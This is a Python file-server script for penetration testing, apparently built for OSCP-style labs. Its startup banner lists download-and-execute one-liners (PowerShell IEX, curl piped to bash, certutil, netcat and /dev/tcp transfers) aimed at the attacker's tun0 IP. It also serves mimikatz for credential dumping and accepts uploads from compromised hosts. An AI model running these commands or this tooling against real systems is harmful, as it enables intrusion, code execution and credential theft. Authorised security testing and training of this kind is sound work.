#!/usr/bin/python

'''
	Simple HTTP server with shortcuts and tweaks
'''
import http.server
import socketserver
import os
import sys
import subprocess
import cgi
import warnings

#Suppress deprecated cgi warnings
warnings.filterwarnings("ignore", category=DeprecationWarning, module="cgi")

#Gets the IP on the tun0 interface or uses provided IP
def get_target_ip():
	# Check if IP was provided as command line argument
	if len(sys.argv) >= 3:
		return sys.argv[2]
	
	# Otherwise try to get tun0 IP
	try:
		resultado = subprocess.check_output(["ip", "addr", "show", "tun0"]).decode("utf-8")
		lineas = resultado.split("\n")
		for linea in lineas:
			if "inet" in linea and "tun0" in linea:
				# Extraer la dirección IP
				partes = linea.split()
				direccion_ip = partes[1].split("/")[0]
				return direccion_ip
	except subprocess.CalledProcessError:
		return "IP_KALI"

#Get IP and Port for banner
BANNER_IP = get_target_ip()
BANNER_PORT = 80
if len(sys.argv) >= 2:
	BANNER_PORT = int(sys.argv[1])

#Important banner with real IP
print(rf"""
 -----------------------------------------------------------------------------------------------
               _  _ ___ ___ ___     ____ _  _ _  _    ____ ____ _  _ ____ ____ 
               |__|  |   |  |__]    |__| |  |  \/     [__  |__/ |  | |___ |__/ 
               |  |  |   |  |       |  | |__| _/\_    ___] |  \  \/  |___ |  \ 
                                                                               
 -----------------------------------------------------------------------------------------------
                                                                                     gen0ne@~>

#### 🌐 DOWNLOAD SERVER ACTIVE
----
Base URL: http://{BANNER_IP}:{BANNER_PORT}/

#### 💀 Recon
----
iex ((New-Object System.Net.WebClient).DownloadString('http://{BANNER_IP}:{BANNER_PORT}/recon.ps1'))
iex ((New-Object System.Net.WebClient).DownloadString('http://{BANNER_IP}:{BANNER_PORT}/recon-pivot.ps1'))
. <(curl http://{BANNER_IP}:{BANNER_PORT}/recon.sh)

#### 📦 WINDOWS DOWNLOAD METHODS
----
##### PowerShell
Download:
    - IWR http://{BANNER_IP}:{BANNER_PORT}/file -OutFile file               # Invoke-WebRequest (PS3+)
    - IWR -Uri http://{BANNER_IP}:{BANNER_PORT}/file -OutFile file        # Full syntax
    - wget http://{BANNER_IP}:{BANNER_PORT}/file -O file                  # PS alias
    - curl http://{BANNER_IP}:{BANNER_PORT}/file -o file                  # PS alias
    - (New-Object Net.WebClient).DownloadFile('http://{BANNER_IP}:{BANNER_PORT}/file','file')
    - Start-BitsTransfer -Source http://{BANNER_IP}:{BANNER_PORT}/file -Destination file
Download + Execute:
    - IEX(IWR http://{BANNER_IP}:{BANNER_PORT}/file -UseBasicParsing)     # Execute PS script
    - IEX(New-Object Net.WebClient).DownloadString('http://{BANNER_IP}:{BANNER_PORT}/file')
    - powershell -c "IWR http://{BANNER_IP}:{BANNER_PORT}/file.exe -O file.exe; .\\file.exe"

##### CMD
    - certutil -urlcache -f http://{BANNER_IP}:{BANNER_PORT}/file file    # Classic
    - bitsadmin /transfer job http://{BANNER_IP}:{BANNER_PORT}/file %CD%\\file # Legacy

#### 🐧 LINUX DOWNLOAD METHODS
----
##### Basic
    - wget http://{BANNER_IP}:{BANNER_PORT}/file -O file                  # Rename
    - curl http://{BANNER_IP}:{BANNER_PORT}/file -o file                  # Save
    - curl -O http://{BANNER_IP}:{BANNER_PORT}/file                       # Keep name
Download + Execute:
    - curl http://{BANNER_IP}:{BANNER_PORT}/script.sh | bash              # Execute script
    - wget -qO- http://{BANNER_IP}:{BANNER_PORT}/script.sh | bash         # Quiet mode
    - bash <(curl -s http://{BANNER_IP}:{BANNER_PORT}/script.sh)          # Process substitution

#### 📡 NETCAT TRANSFER METHODS (TCP)
----
##### Upload (Target -> Server)
    - nc {BANNER_IP} {BANNER_PORT} < file
    - cat file | nc {BANNER_IP} {BANNER_PORT}
##### Download (Server -> Target)
    - [Server] nc -lvnp {BANNER_PORT} < file
    - [Target] nc {BANNER_IP} {BANNER_PORT} > file

#### 💡 ALTERNATIVE METHODS
----
    - /dev/tcp: exec 3<>/dev/tcp/{BANNER_IP}/{BANNER_PORT}; cat <&3 > file; cat file >&3
    - Python: python -c "import urllib;urllib.urlretrieve('http://{BANNER_IP}:{BANNER_PORT}/file','file')"
    - Python3: python3 -c "import urllib.request;urllib.request.urlretrieve('http://{BANNER_IP}:{BANNER_PORT}/file','file')"
    - PHP: php -r "file_put_contents('file',file_get_contents('http://{BANNER_IP}:{BANNER_PORT}/file'));"
    - Perl: perl -e 'use LWP::Simple; getstore("http://{BANNER_IP}:{BANNER_PORT}/file","file");'
    - Ruby: ruby -e 'require "open-uri"; download=open("http://{BANNER_IP}:{BANNER_PORT}/file");IO.copy_stream(download,"file")'

############################ ⚡ SHORTCUTS ⚡ ############################
----
# --- Windows Binaries ---
    - /mm.exe: /home/kali/Scripts/mimikatz64.exe
    - /mm32.exe: /home/kali/Scripts/mimikatz32.exe
    - /mimikatz.exe: /home/kali/Scripts/mimikatz64.exe

# --- Reconnaissance Scripts ---
    - /recon.sh: /home/kali/Scripts/oscp-aux/recon.sh
    - /recon.ps1: /home/kali/Scripts/oscp-aux/recon.ps1
    - /recon-pivot.ps1: /home/kali/Scripts/oscp-aux/recon-pivot.ps1'

""")


#Default port (will be set after banner)
PORT = BANNER_PORT


#Direct access files  <- ** ADD YOUR OWN SHORTCUTS HERE **
SHORTCUTS = {
	#------------------For windows------------------------------------------
	'/mm.exe':'/home/kali/Scripts/mimikatz64.exe',								#Mimikatz
	'/mm32.exe':'/home/kali/Scripts/mimikatz32.exe',							#Mimikatz32
	'/mimikatz.exe':'/home/kali/Scripts/mimikatz64.exe',						#Mimikatz (alias)
	#------------------Recon scripts----------------------------------------
	'/recon.sh':'/home/kali/Scripts/oscp-aux/recon.sh',						#Linux reconnaissance script
	'/recon.ps1':'/home/kali/Scripts/oscp-aux/recon.ps1',						#Windows reconnaissance script
	'/recon-pivot.ps1':'/home/kali/Scripts/oscp-aux/recon-pivot.ps1',						#Windows reconnaissance script PIVOT
}

#Files to replace IP
IP_REPLACE=[
	'/recon.sh',
	'/recon.ps1'
]

#Gets the IP on the tun0 interface
def ip_tun0():
	try:
		resultado = subprocess.check_output(["ip", "addr", "show", "tun0"]).decode("utf-8")
		lineas = resultado.split("\n")
		for linea in lineas:
			if "inet" in linea and "tun0" in linea:
				# Extraer la dirección IP
				partes = linea.split()
				direccion_ip = partes[1].split("/")[0]
				return direccion_ip
	except subprocess.CalledProcessError:
		return "IP_KALI"


class Handler(http.server.SimpleHTTPRequestHandler):

	def __init__(self, *args, **kwargs):
		super().__init__(*args, directory='.', **kwargs)

	def do_GET(self):
		# Check if it's a shortcut first
		if self.path in SHORTCUTS:
			file_path = os.path.expanduser(SHORTCUTS[self.path])
			if os.path.isfile(file_path):
				print(f" [*] Shortcut -> Serving file: {file_path}")
				self.send_file(file_path)
			else:
				print(f" [!] Error -> Shortcut file not found: {file_path}")
				self.send_error(404, f"Shortcut configured but file not found: {file_path}")
		else:
			# Try to serve from current directory
			try:
				super().do_GET()
			except (ConnectionResetError, BrokenPipeError) as e:
				# Client closed connection - this is normal, just log it
				print(f" [!] Connection closed by client: {e}")
			except Exception as e:
				print(f" [!] Error serving file: {e}")

	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		# Get the file name
		f_name = "uploaded_file"
		content_disposition = self.headers.get('Content-Disposition', '')
		if content_disposition:
			_, params = cgi.parse_header(content_disposition)
			f_name = params.get('filename', f_name)
		# Save the file to the current directory
		filename = os.path.join(os.getcwd(), f_name)
		with open(filename, 'wb') as file:
			file.write(post_data)

		self.send_response(200)
		self.end_headers()
		self.wfile.write(b'Received!!')
		print(f" [*] File received: {filename}")

	def send_file(self, file_path):
		try:
			with open(file_path, 'rb') as file:
				# Set headers for content type
				self.send_response(200)
				self.send_header('Content-type', 'application/octet-stream')
				self.send_header('Content-Disposition', 'attachment; filename=' + os.path.basename(file_path))
				
				# To embed tun0 IP in specific files
				if self.path in IP_REPLACE:
					file_content = file.read().decode('utf-8')
					# Replace placeholder with actual IP
					file_content = file_content.replace('{IP_KALI}', ip_tun0())
					self.send_header('Content-Length', len(file_content.encode('utf-8')))
					self.end_headers()
					self.wfile.write(file_content.encode('utf-8'))
				else:
					# Get file size for Content-Length header
					file_size = os.path.getsize(file_path)
					self.send_header('Content-Length', str(file_size))
					self.end_headers()
					# Send the file content to the client
					self.wfile.write(file.read())
					
				print(f" [✓] File sent successfully: {os.path.basename(file_path)}")
				
		except (ConnectionResetError, BrokenPipeError) as e:
			# Client closed connection during transfer - this is normal
			print(f" [!] Connection closed by client during transfer: {os.path.basename(file_path)}")
		except Exception as e:
			print(f" [!] Error sending file: {e}")
			try:
				self.send_error(500, str(e))
			except:
				pass  # Connection already closed

	def log_message(self, format, *args):
		# Custom log format
		print(f" [→] {self.client_address[0]} - {format % args}")


# Allow socket reuse to avoid "Address already in use" errors
socketserver.TCPServer.allow_reuse_address = True

with socketserver.TCPServer(("", PORT), Handler) as httpd:
	print(f" [>] Listening on port {PORT}")
	print(f" [>] TUN0 IP: {ip_tun0()}")
	print(f" [>] Configured shortcuts: {len(SHORTCUTS)}")
	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		print("\n [>] Closing the server...")
		httpd.shutdown()
		httpd.server_close()
		sys.exit(0)
